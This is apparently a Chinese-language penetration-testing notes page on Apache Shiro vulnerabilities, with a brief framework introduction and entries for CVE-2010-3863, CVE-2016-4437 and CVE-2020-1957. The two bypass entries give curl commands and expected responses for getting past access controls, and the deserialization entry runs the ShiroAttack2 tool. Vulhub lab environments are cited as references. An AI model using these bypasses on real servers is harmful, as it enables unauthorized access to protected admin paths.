# Shiro

<details>

<summary>Introduction</summary>

Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，用于实现身份认证、授权、加密和会话管理等安全功能。Shiro 提供了简单的 API 和灵活的配置选项，使得开发人员可以轻松地集成安全功能到他们的应用程序中。它支持多种身份验证方式（如基于用户名密码的认证、OAuth、LDAP 等），并提供了细粒度的授权控制，可以基于角色、权限和资源进行精确的访问控制。Shiro 还提供了易于使用的加密和会话管理功能，帮助开发人员保护敏感信息和维护用户会话状态。由于其灵活性和可定制性，Shiro 被广泛应用于 Java Web 应用程序、桌面应用程序和后端服务等各种场景中，是 Java 安全领域的首选框架之一。

</details>

## CVE-2010-3863 <a href="#apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437" id="apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437"></a>

1.1.0 之前的 Apache Shiro 和 JSecurity 0.9.x 在将 URI 路径与 shiro.ini 文件中的条目进行比较之前不会对其进行规范化，这允许远程攻击者通过精心设计的请求绕过预期的访问限制，如 `/./` 、 `/../` 、 `/` 、 `//` URI。

```bash
HOST=; PORT=8080; # TARGET HOST INFO

curl http://$HOST:$PORT/admin/ -I
# HTTP/1.1 302

curl http://$HOST:$PORT/./admin/ -I
# HTTP/1.1 200
```

## CVE-2016-4437 <a href="#apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437" id="apacheshiro124-fan-xu-lie-hua-lou-dong-cve20164437"></a>

需要配置 JDK 1.8

```bash
cd ~/hack/tools/shiro/ShiroAttack2
java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar
```

```bash
# REFERENCE DOCS
https://github.com/SummerSec/ShiroAttack2
https://vulhub.org/#/environments/shiro/CVE-2016-4437
```

## CVE-2020-1957

在带有 Spring 动态控制器的 Apache Shiro 1.5.2 之前的版本中，攻击者可以使用 `..;` 构造恶意制作的请求来绕过目录身份验证。

```bash
HOST=; PORT=8080; # TARGET HOST INFO

curl http://$HOST:$PORT/admin/ -I
# HTTP/1.1 302

curl http://$HOST:$PORT/xxx/..;/admin/ -I
# HTTP/1.1 200
```

```bash
# REFERENCE DOCS
https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2020-1957/README.zh-cn.md
```
